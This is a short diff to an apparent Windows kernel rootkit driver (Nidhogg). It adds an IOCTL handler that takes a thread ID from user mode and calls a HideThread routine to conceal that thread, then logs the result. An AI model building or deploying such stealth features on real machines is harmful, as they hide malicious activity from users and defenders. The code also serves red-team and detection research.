@@ -300,6 +300,30 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		break;
 	}
 
+	case IOCTL_NIDHOGG_HIDE_THREAD:
+	{
+		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
+		if (size % sizeof(ULONG) != 0) {
+			status = STATUS_INVALID_BUFFER_SIZE;
+			break;
+		}
+
+		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;
+
+		if (data == 0) {
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
+
+		if (!NT_SUCCESS(HideThread(*data))) {
+			status = STATUS_UNSUCCESSFUL;
+			break;
+		}
+
+		KdPrint((DRIVER_PREFIX "Hid thread with tid %d.\n", *data));
+		break;
+	}
+
 	case IOCTL_NIDHOGG_CLEAR_THREAD_PROTECTION:
 	{
 		if (!Features.ThreadProtection) {
